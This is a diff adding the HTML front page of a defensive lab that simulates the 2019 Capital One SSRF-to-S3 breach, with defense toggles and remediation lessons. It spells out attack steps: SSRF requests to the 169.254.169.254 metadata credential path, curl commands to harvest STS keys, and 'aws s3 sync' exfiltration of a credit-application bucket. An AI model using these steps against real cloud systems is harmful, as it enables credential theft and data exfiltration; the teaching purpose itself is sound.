@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CloudGuard – Capital One Cloud Breach Analysis and Prevention</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <!-- Top Navigation Header -->
+  <header class="app-header">
+    <div class="brand-wrapper">
+      <div class="brand-icon">🛡️</div>
+      <div>
+        <h1 class="brand-title">CloudGuard</h1>
+        <p class="brand-subtitle">Capital One Cloud Breach (2019) – SSRF to S3 Exfiltration Simulator & Defense Lab</p>
+      </div>
+    </div>
+
+    <div class="header-controls">
+      <div id="globalStatusPill" class="status-pill vulnerable">
+        <span class="pulse-dot"></span>
+        <span id="globalStatusText">VULNERABLE CONFIGURATION</span>
+      </div>
+      <button id="btnSwitchSecured" class="btn btn-success" title="Switch to Secured Remediated Configuration">
+        🛡️ Apply Secured Config
+      </button>
+      <button id="btnSwitchVulnerable" class="btn btn-danger" title="Switch to Vulnerable 2019 Configuration">
+        ⚠️ Apply Vulnerable Config
+      </button>
+      <button id="btnResetAttack" class="btn btn-secondary" title="Reset Simulation State">
+        🔄 Reset
+      </button>
+    </div>
+  </header>
+
+  <!-- Metrics / Threat Posture Bar -->
+  <section class="metrics-strip">
+    <div class="metric-card critical">
+      <div class="metric-header">
+        <span class="metric-label">Threat Posture</span>
+        <span class="metric-badge bad">RISK LEVEL</span>
+      </div>
+      <div id="metricThreatLevel" class="metric-value">CRITICAL</div>
+      <div class="metric-detail">Capital One 2019 misconfiguration active</div>
+    </div>
+
+    <div class="metric-card warning">
+      <div class="metric-header">
+        <span class="metric-label">WAF Reverse Proxy (SSRF)</span>
+        <span id="badgeSSRF" class="metric-badge bad">EXPLOITABLE</span>
+      </div>
+      <div id="metricSSRFStatus" class="metric-value">OPEN (SSRF Vulnerable)</div>
+      <div class="metric-detail">Outbound queries to 169.254.169.254 allowed</div>
+    </div>
+
+    <div class="metric-card warning">
+      <div class="metric-header">
+        <span class="metric-label">EC2 Metadata Service</span>
+        <span id="badgeIMDS" class="metric-badge bad">NO TOKEN (IMDSv1)</span>
+      </div>
+      <div id="metricIMDSStatus" class="metric-value">IMDSv1</div>
+      <div class="metric-detail">Unauthenticated GET queries allowed</div>
+    </div>
+
+    <div class="metric-card critical">
+      <div class="metric-header">
+        <span class="metric-label">IAM Role Permissions</span>
+        <span id="badgeIAM" class="metric-badge bad">WILDCARD s3:*</span>
+      </div>
+      <div id="metricIAMStatus" class="metric-value">OVER-PRIVILEGED (s3:*)</div>
+      <div class="metric-detail">WAF instance role has full access to all S3 buckets</div>
+    </div>
+
+    <div class="metric-card info">
+      <div class="metric-header">
+        <span class="metric-label">S3 Bucket Perimeter</span>
+        <span id="badgeS3" class="metric-badge bad">UNRESTRICTED</span>
+      </div>
+      <div id="metricS3Status" class="metric-value">OPEN INTERNAL ACCESS</div>
+      <div class="metric-detail">No VPC Endpoint or CMK constraint</div>
+    </div>
+  </section>
+
+  <!-- Tabs Navigation -->
+  <nav class="tabs-nav">
+    <button class="tab-btn active" data-target="tab-attack-lab">
+      <span>⚔️</span> Breach Attack & Defense Lab
+    </button>
+    <button class="tab-btn" data-target="tab-topology">
+      <span>🌐</span> Interactive Cloud Architecture
+    </button>
+    <button class="tab-btn" data-target="tab-terminal">
+      <span>💻</span> AWS CLI & Attack Terminal
+    </button>
+    <button class="tab-btn" data-target="tab-policies">
+      <span>📜</span> Policy Comparator (IAM & S3 Diffs)
+    </button>
+    <button class="tab-btn" data-target="tab-logs">
+      <span>📋</span> CloudTrail Audit Logs
+    </button>
+    <button class="tab-btn" data-target="tab-breach-info">
+      <span>📚</span> Breach Post-Mortem & Education
+    </button>
+  </nav>
+
+  <!-- Main Content Areas -->
+  <main class="main-content">
+
+    <!-- TAB 1: BREACH ATTACK & DEFENSE LAB -->
+    <div id="tab-attack-lab" class="tab-panel active">
+      
+      <!-- Attack Pipeline Cards -->
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>🎯</span> 4-Stage Breach Reproduction Pipeline
+          </div>
+          <div style="display: flex; gap: 0.75rem;">
+            <button id="btnAutoRunAttack" class="btn btn-primary">
+              ⚡ Auto-Run Full Attack Pipeline
+            </button>
+          </div>
+        </div>
+
+        <div class="attack-pipeline">
+          
+          <!-- Step 1: SSRF Probe -->
+          <div id="stepCard1" class="step-card">
+            <div class="step-header">
+              <span class="step-number">STEP 01</span>
+              <span id="stepBadge1" class="step-badge pending">PENDING</span>
+            </div>
+            <div class="step-title">1. SSRF Exploitation</div>
+            <p class="step-desc">
+              Inject URL parameter to trick ModSecurity WAF reverse proxy into fetching AWS Link-Local metadata.
+            </p>
+            <div class="step-command">
+              GET /api/waf/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+            </div>
+            <div class="step-footer">
+              <button id="btnExecStep1" class="btn btn-secondary">Run Step 1</button>
+            </div>
+          </div>
+
+          <!-- Step 2: Metadata Harvesting -->
+          <div id="stepCard2" class="step-card">
+            <div class="step-header">
+              <span class="step-number">STEP 02</span>
+              <span id="stepBadge2" class="step-badge pending">PENDING</span>
+            </div>
+            <div class="step-title">2. Harvest STS Keys</div>
+            <p class="step-desc">
+              Exploit IMDSv1 unauthenticated endpoint to steal temporary AWS STS credentials for <code>app-waf-production-role</code>.
+            </p>
+            <div class="step-command">
+              GET /latest/meta-data/iam/security-credentials/app-waf-production-role
+            </div>
+            <div class="step-footer">
+              <button id="btnExecStep2" class="btn btn-secondary">Run Step 2</button>
+            </div>
+          </div>
+
+          <!-- Step 3: Cloud Reconnaissance -->
+          <div id="stepCard3" class="step-card">
+            <div class="step-header">
+              <span class="step-number">STEP 03</span>
+              <span id="stepBadge3" class="step-badge pending">PENDING</span>
+            </div>
+            <div class="step-title">3. S3 Reconnaissance</div>
+            <p class="step-desc">
+              Execute <code>aws s3 ls</code> with stolen STS credentials to enumerate confidential data lake buckets.
+            </p>
+            <div class="step-command">
+              aws s3 ls --profile stolen_waf_role
+            </div>
+            <div class="step-footer">
+              <button id="btnExecStep3" class="btn btn-secondary">Run Step 3</button>
+            </div>
+          </div>
+
+          <!-- Step 4: Data Exfiltration -->
+          <div id="stepCard4" class="step-card">
+            <div class="step-header">
+              <span class="step-number">STEP 04</span>
+              <span id="stepBadge4" class="step-badge pending">PENDING</span>
+            </div>
+            <div class="step-title">4. S3 Exfiltration</div>
+            <p class="step-desc">
+              Execute <code>aws s3 sync</code> to download customer credit application records, SSNs, and financials.
+            </p>
+            <div class="step-command">
+              aws s3 sync s3://c1-prod-credit-applications/ ./exfiltrated/
+            </div>
+            <div class="step-footer">
+              <button id="btnExecStep4" class="btn btn-secondary">Run Step 4</button>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Attack Console Output -->
+        <div style="margin-top: 1rem;">
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
+            <span style="font-size: 0.8rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">
+              📡 Pipeline Execution Telemetry & Security Diagnostics
+            </span>
+          </div>
+          <div id="attackOutputBox" class="step-output-box">
+CloudGuard Simulation Ready.
+Select a scenario above ("Vulnerable Configuration" or "Secured Configuration"), then execute steps 1 through 4 or click "Auto-Run Full Attack Pipeline".
+          </div>
+        </div>
+      </div>
+
+      <!-- Exfiltrated Data Viewer -->
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>🚨</span> Compromised Customer Credit Applications
+          </div>
+          <div id="exfilCountBadge" class="status-pill" style="background: rgba(148, 163, 184, 0.1); color: var(--text-muted); border-color: var(--border-color);">
+            0 Records Compromised
+          </div>
+        </div>
+        <div id="exfiltratedDataTable">
+          <p style="color: var(--text-dim); text-align: center; padding: 2rem;">
+            No data exfiltrated yet. Run Step 4 in Vulnerable Mode to demonstrate customer credit application compromise.
+          </p>
+        </div>
+      </div>
+
+      <!-- Defense Toggle Matrix -->
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>🎛️</span> Granular Security Defense Controls (Toggle Individual Layers)
+          </div>
+        </div>
+        <p style="font-size: 0.82rem; color: var(--text-muted); margin-bottom: 1rem;">
+          Fine-tune the security posture to observe how defense-in-depth functions at each distinct architecture layer:
+        </p>
+        <div class="toggles-grid">
+          
+          <div class="toggle-item">
+            <div class="toggle-info">
+              <h4>1. SSRF Egress Filtering</h4>
+              <p>Block requests to 169.254.169.254 & private RFC1918 IPs</p>
+            </div>
+            <label class="switch">
+              <input type="checkbox" id="toggleSSRF">
+              <span class="slider"></span>
+            </label>
+          </div>
+
+          <div class="toggle-item">
+            <div class="toggle-info">
+              <h4>2. Mandatory IMDSv2</h4>
+              <p>Require session token (PUT handshake with hop-limit=1)</p>
+            </div>
+            <label class="switch">
+              <input type="checkbox" id="toggleIMDS">
+              <span class="slider"></span>
+            </label>
+          </div>
+
+          <div class="toggle-item">
+            <div class="toggle-info">
+              <h4>3. IAM Least Privilege</h4>
+              <p>Remove wildcard s3:* from WAF role; scope to logs only</p>
+            </div>
+            <label class="switch">
+              <input type="checkbox" id="toggleIAM">
+              <span class="slider"></span>
+            </label>
+          </div>
+
+          <div class="toggle-item">
+            <div class="toggle-info">
+              <h4>4. S3 VPC Endpoint Policy</h4>
+              <p>Enforce aws:sourceVpce condition on confidential buckets</p>
+            </div>
+            <label class="switch">
+              <input type="checkbox" id="toggleS3">
+              <span class="slider"></span>
+            </label>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+
+    <!-- TAB 2: INTERACTIVE CLOUD ARCHITECTURE TOPOLOGY -->
+    <div id="tab-topology" class="tab-panel">
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>🌐</span> Interactive Cloud Architecture & Traffic Flow
+          </div>
+          <span style="font-size: 0.78rem; color: var(--text-muted);">
+            Click on any node to inspect its configuration and security posture
+          </span>
+        </div>
+
+        <div class="topology-container">
+          <canvas id="topologyCanvas"></canvas>
+        </div>
+
+        <div class="topology-legend">
+          <div class="legend-item">
+            <span class="legend-dot" style="background: #ef4444;"></span>
+            <span>Adversary / Threat Vector</span>
+          </div>
+          <div class="legend-item">
+            <span class="legend-dot" style="background: #38bdf8;"></span>
+            <span>Public Compute (EC2 WAF)</span>
+          </div>
+          <div class="legend-item">
+            <span class="legend-dot" style="background: #f59e0b;"></span>
+            <span>Instance Metadata (169.254.169.254)</span>
+          </div>
+          <div class="legend-item">
+            <span class="legend-dot" style="background: #a855f7;"></span>
+            <span>AWS IAM / STS</span>
+          </div>
+          <div class="legend-item">
+            <span class="legend-dot" style="background: #10b981;"></span>
+            <span>Data Lake (Amazon S3)</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 3: AWS CLI & ATTACK TERMINAL -->
+    <div id="tab-terminal" class="tab-panel">
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>💻</span> Simulated AWS CLI & Exploitation Terminal
+          </div>
+          <button class="btn btn-secondary" onclick="document.getElementById('terminalBody').innerHTML=''">
+            Clear Terminal
+          </button>
+        </div>
+
+        <div class="terminal-window">
+          <div class="terminal-titlebar">
+            <div class="terminal-dots">
+              <span class="terminal-dot dot-red"></span>
+              <span class="terminal-dot dot-yellow"></span>
+              <span class="terminal-dot dot-green"></span>
+            </div>
+            <div class="terminal-title">cloudguard-bash — 80x24</div>
+            <div style="width: 40px;"></div>
+          </div>
+
+          <!-- Quick Command Shortcuts -->
+          <div class="quick-commands">
+            <span style="font-size: 0.72rem; color: var(--text-dim); align-self: center; margin-right: 0.25rem;">Quick Commands:</span>
+            <button class="cmd-pill" data-cmd='curl "http://localhost:5000/api/waf/proxy?url=http://169.254.169.254/latest/meta-data/"'>curl IMDS via WAF</button>
+            <button class="cmd-pill" data-cmd='curl "http://localhost:5000/api/waf/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-waf-production-role"'>curl Harvest STS Keys</button>
+            <button class="cmd-pill" data-cmd="aws sts get-caller-identity">aws sts get-caller-identity</button>
+            <button class="cmd-pill" data-cmd="aws iam get-role-policy">aws iam get-role-policy</button>
+            <button class="cmd-pill" data-cmd="aws s3 ls">aws s3 ls</button>
+            <button class="cmd-pill" data-cmd="aws s3 ls s3://c1-prod-credit-applications">aws s3 ls s3://credit-apps</button>
+            <button class="cmd-pill" data-cmd="aws s3 cp s3://c1-prod-credit-applications/customer_credit_applications_2019.json .">aws s3 cp applications.json</button>
+            <button class="cmd-pill" data-cmd="switch secured">switch secured</button>
+            <button class="cmd-pill" data-cmd="switch vulnerable">switch vulnerable</button>
+            <button class="cmd-pill" data-cmd="status">status</button>
+            <button class="cmd-pill" data-cmd="help">help</button>
+          </div>
+
+          <div id="terminalBody" class="terminal-body"></div>
+
+          <div class="terminal-input-row">
+            <span class="terminal-prompt">attacker@cloudguard:~$</span>
+            <input type="text" id="terminalInput" class="terminal-input" placeholder="Type command here (e.g. aws s3 ls) and press Enter..." autocomplete="off">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 4: POLICY COMPARATOR -->
+    <div id="tab-policies" class="tab-panel">
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>📜</span> IAM Role & S3 Bucket Policy Comparative Analysis
+          </div>
+        </div>
+
+        <h3 style="font-size: 0.95rem; margin-bottom: 0.75rem; color: #38bdf8;">
+          1. EC2 Instance IAM Role Policy (<code>app-waf-production-role</code>)
+        </h3>
+        <div class="policy-grid" style="margin-bottom: 2rem;">
+          <div class="policy-box">
+            <div class="policy-header bad">
+              <span>⚠️ Vulnerable IAM Policy (Capital One 2019)</span>
+              <span>OVER-PRIVILEGED</span>
+            </div>
+            <pre id="vulnIAMPolicy" class="policy-code">Loading...</pre>
+          </div>
+
+          <div class="policy-box">
+            <div class="policy-header good">
+              <span>🛡️ Secured IAM Policy (Principle of Least Privilege)</span>
+              <span>REMEDIATED</span>
+            </div>
+            <pre id="secIAMPolicy" class="policy-code">Loading...</pre>
+          </div>
+        </div>
+
+        <h3 style="font-size: 0.95rem; margin-bottom: 0.75rem; color: #38bdf8;">
+          2. S3 Bucket Policy (<code>c1-prod-credit-applications</code>)
+        </h3>
+        <div class="policy-grid">
+          <div class="policy-box">
+            <div class="policy-header bad">
+              <span>⚠️ Vulnerable Bucket Policy (No VPC/Key Boundary)</span>
+              <span>UNRESTRICTED</span>
+            </div>
+            <pre id="vulnS3Policy" class="policy-code">Loading...</pre>
+          </div>
+
+          <div class="policy-box">
+            <div class="policy-header good">
+              <span>🛡️ Secured Bucket Policy (Restricted to VPC Endpoint)</span>
+              <span>REMEDIATED</span>
+            </div>
+            <pre id="secS3Policy" class="policy-code">Loading...</pre>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- TAB 5: CLOUDTRAIL AUDIT LOGS -->
+    <div id="tab-logs" class="tab-panel">
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>📋</span> AWS CloudTrail Forensics & Security Event Logs
+          </div>
+          <div style="display: flex; gap: 0.5rem;">
+            <button class="btn btn-secondary" onclick="window.CloudGuardApp.refreshAuditLogs()">
+              🔄 Refresh Logs
+            </button>
+            <button class="btn btn-secondary" onclick="fetch('/api/logs/clear', {method: 'POST'}).then(() => window.CloudGuardApp.refreshAuditLogs())">
+              🗑️ Clear Logs
+            </button>
+          </div>
+        </div>
+
+        <div id="auditLogsContainer">
+          <p style="color: var(--text-dim); text-align: center; padding: 2rem;">Loading audit logs...</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 6: BREACH POST-MORTEM & EDUCATION -->
+    <div id="tab-breach-info" class="tab-panel">
+      <div class="cyber-card">
+        <div class="card-title-bar">
+          <div class="card-title">
+            <span>📚</span> The 2019 Capital One Breach: Post-Mortem & Architecture Lessons
+          </div>
+        </div>
+
+        <div class="knowledge-grid">
+          <div>
+            <h3 style="font-size: 1rem; color: #38bdf8; margin-bottom: 0.75rem;">
+              Critical Misconfigurations & Root Causes
+            </h3>
+            <div id="rootCausesContainer">
+              <p style="color: var(--text-dim);">Loading root causes...</p>
+            </div>
+
+            <div style="background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 10px; padding: 1.25rem; margin-top: 1.5rem;">
+              <h4 style="color: #60a5fa; font-size: 0.95rem; margin-bottom: 0.5rem;">
+                Key Takeaways for Cloud Architects:
+              </h4>
+              <ul style="font-size: 0.82rem; color: #cbd5e1; padding-left: 1.25rem; line-height: 1.7;">
+                <li><strong>Defense-in-Depth Matters:</strong> The breach was not caused by a single bug. It required an SSRF flaw, unauthenticated IMDSv1, an overly permissive IAM role, and unconstrained S3 bucket policies simultaneously.</li>
+                <li><strong>Migrate to IMDSv2:</strong> AWS IMDSv2 completely neutralizes simple SSRF attacks against instance metadata by requiring session-oriented PUT handshakes.</li>
+                <li><strong>Enforce Least Privilege:</strong> Web-facing reverse proxies should never have permissions to read corporate customer databases or S3 data lakes.</li>
+                <li><strong>Perimeter Isolation:</strong> S3 buckets containing sensitive financial data should require VPC Endpoints (<code>aws:sourceVpce</code>) and Customer Managed Keys (CMKs) with independent access controls.</li>
+              </ul>
+            </div>
+          </div>
+
+          <div>
+            <h3 style="font-size: 1rem; color: #38bdf8; margin-bottom: 0.75rem;">
+              Incident Timeline
+            </h3>
+            <div id="breachTimeline" class="timeline">
+              <p style="color: var(--text-dim);">Loading incident timeline...</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Toast Notification Container -->
+  <div id="toastContainer" class="toast-container"></div>
+
+  <!-- Scripts -->
+  <script src="js/topology.js"></script>
+  <script src="js/terminal.js"></script>
+  <script src="js/app.js"></script>
+</body>
+</html>
